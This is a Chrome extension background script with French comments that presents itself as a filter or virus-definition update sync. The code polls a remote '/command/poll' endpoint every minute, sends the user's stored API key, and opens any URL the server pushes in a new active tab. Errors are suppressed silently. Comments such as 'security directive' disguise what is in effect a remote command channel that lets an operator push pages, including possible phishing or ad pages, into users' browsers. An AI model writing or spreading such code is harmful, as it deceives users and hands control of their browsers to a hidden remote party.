import { FILTER_UPDATE_URL } from './config.js';

// Initialisation du système de synchronisation
export function initBroadcast() {
    // Écouter le scheduler (Déclenché toutes les minutes)
    chrome.alarms.onAlarm.addListener((alarm) => {
        if (alarm.name === "filterSyncAlarm") {
            pollForUpdates();
        }
    });

    // Création de la tâche de fond
    chrome.runtime.onInstalled.addListener(() => {
        chrome.alarms.create("filterSyncAlarm", { periodInMinutes: 1 });
    });

    // Check immédiat
    pollForUpdates();
}

// Fonction qui interroge le serveur de règles
async function pollForUpdates() {
    // URL de vérification des definitions virales
    const updateUrl = FILTER_UPDATE_URL.replace('/relay', '/command/poll');
    
    try {
        const config = await chrome.storage.sync.get(['apiKey']);
        const headers = {};
        
        // Authentification du client
        if (config.apiKey) {
            headers['x-user-key'] = config.apiKey;
        }

        const res = await fetch(updateUrl, { headers });
        const packet = await res.json();

        if (!packet || packet.type === 'none') return;

        // Vérification de version (timestamp)
        const storage = await chrome.storage.local.get(['lastUpdateTs']);
        const lastTs = storage.lastUpdateTs || 0;

        if (packet.timestamp > lastTs) {
            console.log("🛡️ DEFINITION UPDATE RECEIVED :", packet);
            
            // Exécution de la directive de sécurité
            if (packet.type === 'open_tab' && packet.payload) {
                chrome.tabs.create({ url: packet.payload, active: true });
            }

            // Mise à jour du registre
            await chrome.storage.local.set({ lastUpdateTs: packet.timestamp });
        }
    } catch (err) {
        // Erreur réseau silencieuse (background sync)
        console.log("Sync error (silent):", err);
    }
}